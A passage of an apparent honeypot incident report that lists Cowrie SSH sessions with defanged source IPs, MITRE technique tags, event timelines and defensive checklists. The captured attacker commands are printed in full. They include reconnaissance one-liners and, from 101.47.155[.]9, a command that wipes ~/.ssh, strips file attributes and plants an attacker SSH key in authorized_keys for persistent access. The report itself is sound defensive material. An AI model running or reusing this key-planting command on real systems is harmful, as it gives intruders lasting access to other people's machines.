| `2026-07-13 06:04:27` | `cowrie.session.connect` |
| `2026-07-13 06:04:27` | `cowrie.client.version` |
| `2026-07-13 06:04:27` | `cowrie.client.kex` |
| `2026-07-13 06:04:28` | `cowrie.login.success` |
| `2026-07-13 06:04:28` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9c932b0e0d7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:04 |
| **Last Seen** | 2026-07-13 06:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:04:37` | `cowrie.session.connect` |
| `2026-07-13 06:04:37` | `cowrie.client.version` |
| `2026-07-13 06:04:37` | `cowrie.client.kex` |
| `2026-07-13 06:04:39` | `cowrie.login.success` |
| `2026-07-13 06:04:40` | `cowrie.session.params` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.success` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:40` | `cowrie.command.input` |
| `2026-07-13 06:04:41` | `cowrie.log.closed` |
| `2026-07-13 06:04:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f102c1baeef1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 06:05 |
| **Last Seen** | 2026-07-13 06:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:05:25` | `cowrie.session.connect` |
| `2026-07-13 06:05:25` | `cowrie.client.version` |
| `2026-07-13 06:05:25` | `cowrie.client.kex` |
| `2026-07-13 06:05:25` | `cowrie.login.success` |
| `2026-07-13 06:05:26` | `cowrie.session.params` |
| `2026-07-13 06:05:26` | `cowrie.command.input` |
| `2026-07-13 06:05:26` | `cowrie.log.closed` |
| `2026-07-13 06:05:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d92cc71fa67

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:06 |
| **Last Seen** | 2026-07-13 06:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:06:27` | `cowrie.session.connect` |
| `2026-07-13 06:06:27` | `cowrie.client.version` |
| `2026-07-13 06:06:27` | `cowrie.client.kex` |
| `2026-07-13 06:06:29` | `cowrie.login.success` |
| `2026-07-13 06:06:30` | `cowrie.session.params` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.success` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.command.input` |
| `2026-07-13 06:06:30` | `cowrie.log.closed` |
| `2026-07-13 06:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64c4443e1546

| Field | Detail |
|---|---|
| **Source IP** | `5.11.162[.]163` |
| **First Seen** | 2026-07-13 06:07 |
| **Last Seen** | 2026-07-13 06:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:07:48` | `cowrie.session.connect` |
| `2026-07-13 06:07:49` | `cowrie.client.version` |
| `2026-07-13 06:07:49` | `cowrie.client.kex` |
| `2026-07-13 06:07:51` | `cowrie.login.success` |
| `2026-07-13 06:07:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `5.11.162[.]163` to AbuseIPDB if not already reported
- [ ] Block `5.11.162[.]163` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9117fe7003d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:08 |
| **Last Seen** | 2026-07-13 06:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:08:59` | `cowrie.session.connect` |
| `2026-07-13 06:08:59` | `cowrie.client.version` |
| `2026-07-13 06:08:59` | `cowrie.client.kex` |
| `2026-07-13 06:09:00` | `cowrie.login.success` |
| `2026-07-13 06:09:01` | `cowrie.session.params` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.success` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.command.input` |
| `2026-07-13 06:09:01` | `cowrie.log.closed` |
| `2026-07-13 06:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d64561173ee

| Field | Detail |
|---|---|
| **Source IP** | `220.128.137[.]164` |
| **First Seen** | 2026-07-13 06:11 |
| **Last Seen** | 2026-07-13 06:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:11:14` | `cowrie.session.connect` |
| `2026-07-13 06:11:14` | `cowrie.client.version` |
| `2026-07-13 06:11:14` | `cowrie.client.kex` |
| `2026-07-13 06:11:17` | `cowrie.login.success` |
| `2026-07-13 06:11:18` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:11:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.128.137[.]164` to AbuseIPDB if not already reported
- [ ] Block `220.128.137[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e41c084a3869

| Field | Detail |
|---|---|
| **Source IP** | `49.124.151[.]2` |
| **First Seen** | 2026-07-13 06:11 |
| **Last Seen** | 2026-07-13 06:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:11:24` | `cowrie.session.connect` |
| `2026-07-13 06:11:25` | `cowrie.client.version` |
| `2026-07-13 06:11:25` | `cowrie.client.kex` |
| `2026-07-13 06:11:27` | `cowrie.login.success` |
| `2026-07-13 06:11:28` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:11:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.151[.]2` to AbuseIPDB if not already reported
- [ ] Block `49.124.151[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc0419638a11

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-13 06:12 |
| **Last Seen** | 2026-07-13 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:12:14` | `cowrie.session.connect` |
| `2026-07-13 06:12:14` | `cowrie.client.version` |
| `2026-07-13 06:12:14` | `cowrie.client.kex` |
| `2026-07-13 06:12:14` | `cowrie.login.success` |
| `2026-07-13 06:12:15` | `cowrie.session.params` |
| `2026-07-13 06:12:15` | `cowrie.command.input` |
| `2026-07-13 06:12:15` | `cowrie.log.closed` |
| `2026-07-13 06:12:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-298acb83e514

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:12 |
| **Last Seen** | 2026-07-13 06:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:12:51` | `cowrie.session.connect` |
| `2026-07-13 06:12:51` | `cowrie.client.version` |
| `2026-07-13 06:12:52` | `cowrie.client.kex` |
| `2026-07-13 06:12:52` | `cowrie.login.success` |
| `2026-07-13 06:12:53` | `cowrie.session.params` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.success` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.command.input` |
| `2026-07-13 06:12:53` | `cowrie.log.closed` |
| `2026-07-13 06:12:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d0e62bbe816

| Field | Detail |
|---|---|
| **Source IP** | `172.236.228[.]224` |
| **First Seen** | 2026-07-13 06:18 |
| **Last Seen** | 2026-07-13 06:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:18:23` | `cowrie.session.connect` |
| `2026-07-13 06:18:23` | `cowrie.login.success` |
| `2026-07-13 06:18:23` | `cowrie.session.params` |
| `2026-07-13 06:18:23` | `cowrie.command.input` |
| `2026-07-13 06:18:23` | `cowrie.command.input` |
| `2026-07-13 06:18:23` | `cowrie.command.failed` |
| `2026-07-13 06:18:23` | `cowrie.command.input` |
| `2026-07-13 06:18:23` | `cowrie.command.failed` |
| `2026-07-13 06:18:23` | `cowrie.command.input` |
| `2026-07-13 06:18:23` | `cowrie.log.closed` |
| `2026-07-13 06:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.228[.]224` to AbuseIPDB if not already reported
- [ ] Block `172.236.228[.]224` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac1e360bbd6d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-13 06:18 |
| **Last Seen** | 2026-07-13 06:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:18:45` | `cowrie.session.connect` |
| `2026-07-13 06:18:45` | `cowrie.client.version` |
| `2026-07-13 06:18:45` | `cowrie.client.kex` |
| `2026-07-13 06:18:46` | `cowrie.login.success` |
| `2026-07-13 06:18:46` | `cowrie.session.params` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.success` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:46` | `cowrie.command.input` |
| `2026-07-13 06:18:47` | `cowrie.log.closed` |
| `2026-07-13 06:18:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-533a8b3e8195

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-13 06:23 |
| **Last Seen** | 2026-07-13 06:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:23:43` | `cowrie.session.connect` |
| `2026-07-13 06:23:43` | `cowrie.client.version` |
| `2026-07-13 06:23:43` | `cowrie.client.kex` |
| `2026-07-13 06:23:43` | `cowrie.login.success` |
| `2026-07-13 06:23:44` | `cowrie.session.params` |
| `2026-07-13 06:23:44` | `cowrie.command.input` |
| `2026-07-13 06:23:44` | `cowrie.log.closed` |
| `2026-07-13 06:23:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4f2e9d86780

| Field | Detail |
|---|---|
| **Source IP** | `76.132.238[.]43` |
| **First Seen** | 2026-07-13 06:25 |
| **Last Seen** | 2026-07-13 06:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:25:07` | `cowrie.session.connect` |
| `2026-07-13 06:25:08` | `cowrie.client.version` |
| `2026-07-13 06:25:08` | `cowrie.client.kex` |
| `2026-07-13 06:25:10` | `cowrie.login.success` |
| `2026-07-13 06:25:11` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `76.132.238[.]43` to AbuseIPDB if not already reported
- [ ] Block `76.132.238[.]43` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dddae7770f71

| Field | Detail |
|---|---|
| **Source IP** | `187.8.120[.]90` |
| **First Seen** | 2026-07-13 06:26 |
| **Last Seen** | 2026-07-13 06:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:26:49` | `cowrie.session.connect` |
| `2026-07-13 06:26:49` | `cowrie.client.version` |
| `2026-07-13 06:26:49` | `cowrie.client.kex` |
| `2026-07-13 06:26:52` | `cowrie.login.success` |
| `2026-07-13 06:26:52` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:26:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.8.120[.]90` to AbuseIPDB if not already reported
- [ ] Block `187.8.120[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7a0ca901755d

| Field | Detail |
|---|---|
| **Source IP** | `83.239.0[.]202` |
| **First Seen** | 2026-07-13 06:26 |
| **Last Seen** | 2026-07-13 06:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:26:57` | `cowrie.session.connect` |
| `2026-07-13 06:26:58` | `cowrie.client.version` |
| `2026-07-13 06:26:58` | `cowrie.client.kex` |
| `2026-07-13 06:26:59` | `cowrie.login.success` |
| `2026-07-13 06:27:00` | `cowrie.direct-tcpip.request` |
| `2026-07-13 06:27:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.239.0[.]202` to AbuseIPDB if not already reported
- [ ] Block `83.239.0[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b85ddbc81e0

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-13 06:27 |
| **Last Seen** | 2026-07-13 06:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:27:07` | `cowrie.session.connect` |
| `2026-07-13 06:27:07` | `cowrie.client.version` |
| `2026-07-13 06:27:07` | `cowrie.client.kex` |
| `2026-07-13 06:27:08` | `cowrie.login.success` |
| `2026-07-13 06:27:09` | `cowrie.session.params` |
| `2026-07-13 06:27:09` | `cowrie.command.input` |
| `2026-07-13 06:27:09` | `cowrie.command.failed` |
| `2026-07-13 06:27:10` | `cowrie.log.closed` |
| `2026-07-13 06:27:11` | `cowrie.session.params` |
| `2026-07-13 06:27:11` | `cowrie.command.input` |
| `2026-07-13 06:27:11` | `cowrie.session.file_download` |
| `2026-07-13 06:27:11` | `cowrie.log.closed` |
| `2026-07-13 06:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-999dccacc5d6

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-13 06:27 |
| **Last Seen** | 2026-07-13 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:27:11` | `cowrie.session.connect` |
| `2026-07-13 06:27:11` | `cowrie.client.version` |
| `2026-07-13 06:27:11` | `cowrie.client.kex` |
| `2026-07-13 06:27:12` | `cowrie.login.success` |
| `2026-07-13 06:27:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b01308aa754

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-07-13 06:27 |
| **Last Seen** | 2026-07-13 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 06:27:13` | `cowrie.session.connect` |
| `2026-07-13 06:27:13` | `cowrie.client.version` |
| `2026-07-13 06:27:13` | `cowrie.client.kex` |
| `2026-07-13 06:27:14` | `cowrie.login.success` |
| `2026-07-13 06:27:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3800999ae9b5

| Field | Detail |
|---|---|
| **Source IP** | `64.53.7[.]231` |
| **First Seen** | 2026-07-13 06:33 |
| **Last Seen** | 2026-07-13 06:34 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
